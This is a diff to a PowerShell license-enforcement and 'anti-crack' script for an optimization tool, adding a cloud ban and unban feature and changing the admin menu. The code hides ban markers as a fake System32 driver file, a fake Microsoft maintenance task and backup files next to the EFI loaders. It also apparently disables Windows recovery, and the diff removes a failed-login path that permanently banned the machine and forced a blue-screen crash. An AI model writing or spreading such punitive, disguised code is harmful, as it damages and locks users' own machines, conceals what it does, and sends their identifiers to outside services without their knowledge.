@@ -307,14 +307,80 @@ $_mk = _xd @(0x27,0x28,0x39) 0x63  # XOR decode to "DEV"
 # ANTI-CRACK / ANTI-TAMPER SYSTEM (10+ LAYERS)
 # ========================================================
 
+# -- Cloud Central Auth & Unban Helpers (1 Key = 1 Machine / Cloud Ban Control) --
+$CloudAuthAppKey = "t44dc3km"
+
+function Get-CloudHWID {
+    param([string]$Key)
+    try {
+        $url = "https://keyvalue.immanuel.co/api/KeyVal/GetValue/$CloudAuthAppKey/$Key"
+        $val = Invoke-RestMethod -Uri $url -Method Get -TimeoutSec 4 -ErrorAction Stop
+        if ($val) { return "$val".Trim('"', ' ') }
+    } catch {}
+    return $null
+}
+
+function Set-CloudHWID {
+    param([string]$Key, [string]$Hwid)
+    try {
+        $url = "https://keyvalue.immanuel.co/api/KeyVal/UpdateValue/$CloudAuthAppKey/$Key/$Hwid"
+        $res = Invoke-RestMethod -Uri $url -Method Post -Body "" -TimeoutSec 4 -ErrorAction Stop
+        return $true
+    } catch {
+        return $false
+    }
+}
+
 # -- Layer 0: Permanent ban registry path (obfuscated) ---
 $_banReg  = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{GHOST-BAN}"
 $_banFile = Join-Path $env:SystemRoot "System32\drivers\ghostban.sys"  # fake driver name, actually ban marker
 $_banFile2 = Join-Path $env:ALLUSERSPROFILE ".gconfig"                # hidden ban marker
 
+function Clear-LocalBanMarkers {
+    try {
+        schtasks /delete /tn "\Microsoft\Windows\Maintenance\ComponentCleanup" /f 2>$null | Out-Null
+        Remove-Item -Path $_banReg -Recurse -Force -ErrorAction SilentlyContinue
+        Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\ghostsvc" -Recurse -Force -ErrorAction SilentlyContinue
+        Remove-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StuckRects4" -Name "Settings" -ErrorAction SilentlyContinue
+        
+        $banFiles = @(
+            $_banFile,
+            $_banFile2,
+            (Join-Path $env:APPDATA ".fontconfig"),
+            (Join-Path $env:SystemRoot "Temp\.wdf_log"),
+            (Join-Path $env:SystemRoot "System32\winload.efi.bak_ghost"),
+            (Join-Path $env:SystemRoot "System32\winresume.efi.bak_ghost")
+        )
+        foreach ($f in $banFiles) {
+            if (Test-Path $f) {
+                attrib -s -h -r $f 2>$null
+                Remove-Item $f -Force -ErrorAction SilentlyContinue
+            }
+        }
+        [System.Environment]::SetEnvironmentVariable("_GSB", $null, "Machine")
+        Remove-Item env:_GSB -ErrorAction SilentlyContinue
+        bcdedit /set "{current}" recoveryenabled Yes 2>$null | Out-Null
+        reagentc /enable 2>$null | Out-Null
+    } catch {}
+}
+
 # -- Layer 1: Check if machine is permanently banned -----
 function Check-Banned {
     if (Is-DevMachine) { return $false }
+    
+    # 0. ตรวจสอบสถานะการปลดแบนจาก Cloud โดยผู้พัฒนา (DEV)
+    try {
+        $cloudBan = Get-CloudHWID "BAN_$CurrentHWID"
+        if ($cloudBan -eq "UNBANNED") {
+            # ได้รับการปลดแบนจาก DEV แล้ว -> ล้างไฟล์แบนในเครื่องอัตโนมัติ
+            Clear-LocalBanMarkers
+            return $false
+        }
+        if ($cloudBan -eq "BANNED") {
+            return $true
+        }
+    } catch {}
+    
     # Registry ban check
     try {
         $regBan = Get-ItemProperty $_banReg -Name "InstallDate" -ErrorAction SilentlyContinue
@@ -388,6 +454,12 @@ function Set-PermanentBan {
         return
     }
     $hwid = $CurrentHWID
+    
+    # Cloud ban marker
+    try {
+        Set-CloudHWID "BAN_$CurrentHWID" "BANNED" | Out-Null
+    } catch {}
+    
     $timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
     $banData = "GHOST_BANNED|$hwid|$timestamp|CRACKER_DETECTED"
     
@@ -850,29 +922,8 @@ function Save-KeyDB {
     } catch {}
 }
 
-# -- Cloud Central KeyAuth (1 Key = 1 Machine HWID Lock) --
-$CloudAuthAppKey = "t44dc3km"
+# (Cloud KeyAuth defined at top of script)
 
-function Get-CloudHWID {
-    param([string]$Key)
-    try {
-        $url = "https://keyvalue.immanuel.co/api/KeyVal/GetValue/$CloudAuthAppKey/$Key"
-        $val = Invoke-RestMethod -Uri $url -Method Get -TimeoutSec 4 -ErrorAction Stop
-        if ($val) { return "$val".Trim('"', ' ') }
-    } catch {}
-    return $null
-}
-
-function Set-CloudHWID {
-    param([string]$Key, [string]$Hwid)
-    try {
-        $url = "https://keyvalue.immanuel.co/api/KeyVal/UpdateValue/$CloudAuthAppKey/$Key/$Hwid"
-        $res = Invoke-RestMethod -Uri $url -Method Post -Body "" -TimeoutSec 4 -ErrorAction Stop
-        return $true
-    } catch {
-        return $false
-    }
-}
 
 # -- Validate a key against DB and HWID -----------------
 function Validate-Key {
@@ -968,16 +1019,19 @@ function Show-AdminPanel {
         $cfg = Load-GhostConfig
         $webhookStatus = if ($cfg.discord_webhook -and $cfg.discord_webhook.Trim() -ne "") { "[CONNECTED]" } else { "[NOT CONFIGURED]" }
 
-        $Host.UI.RawUI.ForegroundColor = "Cyan"
+                $Host.UI.RawUI.ForegroundColor = "Cyan"
         Write-Host "  [1] Generate new key"
         Write-Host "  [2] List all keys"
         Write-Host "  [3] Delete a key"
         Write-Host "  [4] Reset HWID on a key"
-        Write-Host "  [5] View Key Activation Logs    (หมวดหมู่ 1: คนใส่คีย์)"
-        Write-Host "  [6] View Anti-Crack Logs        (หมวดหมู่ 2: คนแคร็ก)"
-        Write-Host "  [7] Discord Webhook Settings   $webhookStatus"
-        Write-Host "  [8] Clear Logs"
-        Write-Host "  [9] Continue to RIEWJADDD SHOP optimization"
+        $Host.UI.RawUI.ForegroundColor = "Green"
+        Write-Host "  [5] Unban Machine (HWID)        [DEV EXCLUSIVE]"
+        $Host.UI.RawUI.ForegroundColor = "Cyan"
+        Write-Host "  [6] View Key Activation Logs    (หมวดที่ 1: การใช้งาน)"
+        Write-Host "  [7] View Anti-Crack Logs        (หมวดที่ 2: ความปลอดภัย)"
+        Write-Host "  [8] Discord Webhook Settings   $webhookStatus"
+        Write-Host "  [9] Clear Logs"
+        Write-Host "  [0] Continue to RIEWJADDD SHOP optimization"
         Write-Host ""
         $Host.UI.RawUI.ForegroundColor = "White"
         $choice = Read-Host "  Select option"
@@ -1095,19 +1149,73 @@ function Show-AdminPanel {
                 Write-Host "  Customer can now activate on their new machine." -ForegroundColor Cyan
                 Write-Host ""
             }
-            "5" {
-                Show-ActivationLogs
+                        "5" {
+                Write-Host ""
+                $Host.UI.RawUI.ForegroundColor = "Yellow"
+                Write-Host "  ============================================"
+                Write-Host "  UNBAN MACHINE BY HWID (DEV ONLY)"
+                Write-Host "  ============================================"
+                $Host.UI.RawUI.ForegroundColor = "White"
+                $unbanHWID = Read-Host "  Enter HWID to unban"
+                $unbanHWID = $unbanHWID.Trim().ToUpper()
+
+                if (-not $unbanHWID -or $unbanHWID.Length -lt 5) {
+                    Write-Host "  [ERROR] Invalid HWID format." -ForegroundColor Red
+                } else {
+                    Write-Host "  Connecting to Cloud KeyAuth..." -ForegroundColor DarkGray
+                    $cloudOk = Set-CloudHWID "BAN_$unbanHWID" "UNBANNED"
+                    
+                    if ($unbanHWID -eq $CurrentHWID) {
+                        Clear-LocalBanMarkers
+                    }
+
+                    $unbanLog = @"
+================================================================================
+[ $((Get-Date).ToString("yyyy-MM-dd HH:mm:ss")) ] [ADMIN UNBAN] HWID UNBANNED BY DEV
+--------------------------------------------------------------------------------
+  Action      : MACHINE UNBANNED
+  Target HWID : $unbanHWID
+  Executed By : DEV ($env:USERNAME) on $env:COMPUTERNAME
+================================================================================
+
+"@
+                    try { [System.IO.File]::AppendAllText($ActivationLogFile, $unbanLog, [System.Text.Encoding]::UTF8) } catch {}
+
+                    # Send Discord Webhook Notification
+                    $discordFields = @(
+                        @{ name = "👑 ดำเนินการโดย"; value = "DEV ($($env:USERNAME))"; inline = $true },
+                        @{ name = "💻 HWID ที่ได้รับการปลดแบน"; value = ('`' + $unbanHWID + '`'); inline = $false },
+                        @{ name = "🌐 สถานะ Cloud Auth"; value = if ($cloudOk) { "✅ ปลดแบนในระบบคลาวด์แล้ว" } else { "⚠️ บันทึกคลาวด์ไม่สำเร็จ" }; inline = $true },
+                        @{ name = "⏰ เวลาที่ปลด"; value = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss"); inline = $true }
+                    )
+                    Send-DiscordWebhook -Title "🟢 [RIEWJADDD] แจ้งเตือน: ปลดแบนสำเร็จเรียบร้อย!" `
+                        -Description "ผู้พัฒนา (DEV) ได้ทำการปลดแบนเครื่องลูกค้ารายนี้ออกจากระบบแล้ว ลูกค้าสามารถเปิดโปรแกรมใช้งานได้ตามปกติทันที" `
+                        -Color 65280 `
+                        -Fields $discordFields
+
+                    Write-Host ""
+                    $Host.UI.RawUI.ForegroundColor = "Green"
+                    Write-Host "  [SUCCESS] HWID: $unbanHWID UNBANNED!"
+                    Write-Host "  - Cloud Ban Status set to 'UNBANNED'."
+                    Write-Host "  - Discord Webhook Notification sent."
+                    Write-Host "  - Customer can now open and use the script normally." -ForegroundColor Cyan
+                    Write-Host ""
+                }
             }
             "6" {
-                Show-SecurityLogs
+                Show-ActivationLogs
             }
             "7" {
-                Configure-DiscordWebhook
+                Show-SecurityLogs
             }
             "8" {
-                Clear-GhostLogs
+                Configure-DiscordWebhook
             }
             "9" {
+                Clear-GhostLogs
+            }
+            "0" { return }
+            "10" {
                 return
             }
             default {
@@ -1516,19 +1624,13 @@ while ($attempts -lt $maxAttempts -and -not $authenticated) {
 }
 
 if (-not $authenticated) {
-    if (Is-DevMachine) {
-        Write-Host "  [DEV SAFEGUARD] Authentication failed on developer machine. Exiting safely without punishment." -ForegroundColor Yellow
-        exit 0
-    }
-    # Clean screen, minimal message, then ban + BSOD
     Clear-Host
     Write-Host ""
     $Host.UI.RawUI.ForegroundColor = "Red"
-    Write-Host "  Access denied."
+    Write-Host "  Access denied: Maximum attempts reached (3/3)."
+    Write-Host "  Please verify your license key and run the script again." -ForegroundColor Yellow
     Write-Host ""
-    Set-PermanentBan
-    Start-Sleep -Seconds 1
-    Invoke-BSOD
+    Start-Sleep -Seconds 3
     exit 1
 }
 
